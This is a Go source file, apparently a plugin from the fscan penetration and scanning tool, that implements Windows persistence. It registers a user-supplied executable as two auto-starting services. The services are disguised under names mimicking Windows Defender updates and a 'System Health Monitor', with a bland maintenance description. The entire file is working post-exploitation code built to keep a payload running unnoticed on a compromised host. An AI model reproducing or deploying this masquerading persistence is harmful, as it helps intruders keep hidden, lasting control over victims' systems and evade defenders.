//go:build (plugin_winservice || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinServicePlugin struct {
	plugins.BasePlugin
}

func NewWinServicePlugin() *WinServicePlugin {
	return &WinServicePlugin{
		BasePlugin: plugins.NewBasePlugin("winservice"),
	}
}

func (p *WinServicePlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("未指定PE文件，使用 -win-pe 参数")}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("PE文件不存在: %s", pePath)}
	}

	absPath, _ := filepath.Abs(pePath)
	baseName := strings.TrimSuffix(filepath.Base(absPath), filepath.Ext(absPath))

	services := []struct {
		name    string
		display string
		start   string
	}{
		{fmt.Sprintf("WinDefendUpdate_%s", baseName), "Windows Defender Update Service", "auto"},
		{fmt.Sprintf("SysHealthMon_%s", baseName), "System Health Monitor", "delayed-auto"},
	}

	var output strings.Builder
	var successCount int

	for _, svc := range services {
		out, err := exec.Command("sc", "create", svc.name,
			fmt.Sprintf("binPath=%s", absPath),
			fmt.Sprintf("DisplayName=%s", svc.display),
			fmt.Sprintf("start=%s", svc.start)).CombinedOutput()
		if err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: %s\n", svc.name, strings.TrimSpace(string(out))))
			continue
		}
		_ = exec.Command("sc", "description", svc.name, "Provides system maintenance and monitoring services.").Run()
		output.WriteString(fmt.Sprintf("[成功] %s (%s)\n", svc.name, svc.start))
		successCount++
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("winservice_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winservice", func() Plugin {
		return NewWinServicePlugin()
	})
}
